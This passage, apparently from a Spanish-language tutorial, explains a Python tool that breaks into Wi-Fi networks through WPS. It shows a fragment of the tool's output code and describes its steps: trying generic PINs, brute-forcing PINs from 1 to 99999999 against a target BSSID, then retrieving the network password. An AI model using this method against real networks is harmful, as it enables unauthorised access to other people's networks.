                print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(pin, 'cyan'))
                conected = True
                return(pin)
                break
    
    if conected == False:
        print(colored("[!] Unable to connect to this network! ", 'red') + colored("The network is ", 'yellow') + colored("secure ", 'green') + colored("against ", 'yellow') + colored("WPS ", 'red') + colored("attacks!", 'yellow'))
        return("NOPE")
```

La función toma dos argumentos de entrada: `target` y `connected`. El primero es la dirección MAC o el `BSSID` del dispositivo de la red Wi-Fi objetivo y el argumento `connected` es una `variable booleana` que indica si se ha logrado establecer una conexión con la red Wi-Fi objetivo.

En primer lugar, la función define una cadena de caracteres `checker2` que se utilizará más adelante para `verificar si se ha establecido una conexión` con éxito (sería lo mismo a un mensaje de error al conectarnos a la red, por lo que si da ese mensaje significa que no hemos podido conectarnos). Luego, se define una lista de posibles `PINS genéricos` y se realiza una prueba de conexión utilizando estos PINs. `Si se logra establecer una conexión`, la variable connected se establece como True y `se muestra el PIN` utilizado para la conexión.

`Si no` se logra establecer una conexión utilizando los PINs genéricos, la función comienza una prueba de `fuerza bruta` utilizando un rango de `1 a 99999999` como `posibles PINs`. Se comprueba si se ha establecido una conexión con cada PIN probado y si se encuentra un PIN válido, se establece la variable connected como True y se devuelve el PIN utilizado para la conexión.

Y luego en otra función hace una petición que al proporcionar el PIN, el AP nos devuelve la contraseña. 
